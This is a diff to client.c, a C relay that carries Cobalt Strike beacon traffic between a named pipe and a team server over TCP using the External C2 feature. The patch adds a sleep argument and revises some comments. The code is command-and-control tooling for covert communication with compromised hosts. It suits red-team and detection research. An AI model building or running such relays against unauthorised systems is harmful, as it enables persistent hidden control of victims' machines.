@@ -1,9 +1,8 @@
 /**
  * client.c
  * by Daniel Fitzgerald
- * Jan 2020
  *
- * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
+ * Program to provide basic TCP communications for Cobalt Strike using the External C2 feature.
  */
 
 #define _CRT_SECURE_NO_WARNINGS
@@ -168,11 +167,11 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
  */
 void main(int argc, char* argv[])
 {
-	// Set connection and IRC info
-	if (argc != 4)
+	// Set connection info
+	if (argc != 5)
 	{
 		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
+		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR] [SLEEP]");
 		exit(1);
 	}
 
@@ -185,6 +184,9 @@ void main(int argc, char* argv[])
 	
 	char pipe_str[50];
 	strncpy(pipe_str, argv[3], sizeof(pipe_str));
+
+	int sleep;
+	sleep = atoi(argv[4]);
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
@@ -230,7 +232,7 @@ void main(int argc, char* argv[])
 	}
 	printf("Connected to pipe!!\n");
 
-	// Mudge used 1MB max in his example, test this
+	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
@@ -249,6 +251,11 @@ void main(int argc, char* argv[])
 		}
 		printf("Recv %d bytes from beacon\n", read_size);
 		
+		if (read_size == 1)
+		{
+			printf("Finished sending, sleeping %d ms..\n", sleep);
+			Sleep(sleep);
+		}
 
 		sendData(sockfd, buffer, read_size);
 		printf("Sent to TS\n");
